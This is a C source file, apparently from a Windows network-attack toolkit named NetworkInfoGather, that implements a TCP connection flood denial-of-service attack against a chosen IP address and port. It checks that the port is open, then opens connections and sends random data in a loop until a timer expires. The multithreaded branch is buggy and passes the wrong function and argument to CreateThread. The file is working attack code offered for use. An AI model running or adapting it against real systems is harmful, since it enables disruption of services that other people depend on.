
/* 
 * NetworkInfoGather
 * Copyright (C) 2023  SecuProject
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <iphlpapi.h>   // IPAddr

#include "Network.h"
#include "Message.h"
#include "AttackDOS.h"
#include "PortScan.h"


int FullTcpDosConnection(SOCKADDR_IN ServerAddr, char* ipAddress, UINT bufferSize) {
    SOCKET SendingSocket;
    char* payloadBuffer = NULL;

    //SendingSocket = socket(AF_INET, SOCK_DGRAM , IPPROTO_TCP);
    SendingSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (SendingSocket == INVALID_SOCKET) {
        PrintSocketError("Client: socket() failed! Error code");
        return FALSE;
    }
    int iResult = connect(SendingSocket, (SOCKADDR*)&ServerAddr, sizeof(ServerAddr));
    if (iResult != 0) {
        PrintSocketError("Connect() failed! Error code");
        closesocket(SendingSocket);
        return FALSE;
    }

    if (!CopyRandBufferAlloc(&payloadBuffer, bufferSize))
        return FALSE;


    // Send an initial buffer
    iResult = send(SendingSocket, payloadBuffer, (int)bufferSize, 0);
    if (iResult == SOCKET_ERROR) {
        PrintSocketError("Send failed with error");
        PrintSocketError("send failed with error");
        closesocket(SendingSocket);
        return FALSE;
    }
    //printf("[i] Bytes Sent: %ld\n", iResult); // connection close 
    closesocket(SendingSocket);
    return iResult;
}

DWORD WINAPI ThreadTcpFullDosConnection(LPVOID lpParam) {
    PTHREAD_STRUCT_HTTP_DOS pThreadData = (PTHREAD_STRUCT_HTTP_DOS)lpParam;
    SOCKADDR_IN ServerAddr = pThreadData->ServerAddr;
    char* ipAddress = pThreadData->ipAddress;
    UINT bufferSize = pThreadData->bufferSize;
    return FullTcpDosConnection(ServerAddr, ipAddress, bufferSize);
}

BOOL AttackFloodFullTcp(char* ipAddress, int port, int waitTime, UINT bufferSize, BOOL isMultith) {
    clock_t startTime = clock();
    clock_t currentTime = clock();
    SOCKADDR_IN ssin = InitSockAddr(ipAddress, port);
    THREAD_STRUCT_HTTP_DOS threadStructHttpDos = {
        .ServerAddr = ssin,

        .ipAddress = ipAddress,
        .bufferSize = bufferSize
    };
    int sizeDataSize = 0;

    printf("[-] Attack Flooding with FULL TCP connection\n");

    if (!scanPortOpenTCP(ipAddress, port, NULL)) {
        printf("[X] Port %i is CLOSE !\n", port);
        printf("[X] Unable to perform the DOS attack !\n\n");
        return FALSE;
    } else
        printf("[+] Port %i is OPEN !\n", port);

    for (int i = 0; startTime + waitTime > currentTime; i++) {
        DWORD ThreadId = 0;
        if (isMultith) {
            // ERROR ???

            HANDLE Thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)FullTcpDosConnection, &ThreadTcpFullDosConnection, 0, &ThreadId);
            if (Thread != NULL) {
                PrintMsgError2("Create Thread with id: %lu\n", ThreadId);
                CloseHandle(Thread);
            }
        } else {
            sizeDataSize += FullTcpDosConnection(ssin, ipAddress, bufferSize);
            printf("[i] Bytes Sent: %ld kb\r", sizeDataSize / 1000);
        }
        currentTime = clock();
    }
    printf("\n[!] Attack done !\n");
    return sizeDataSize;
}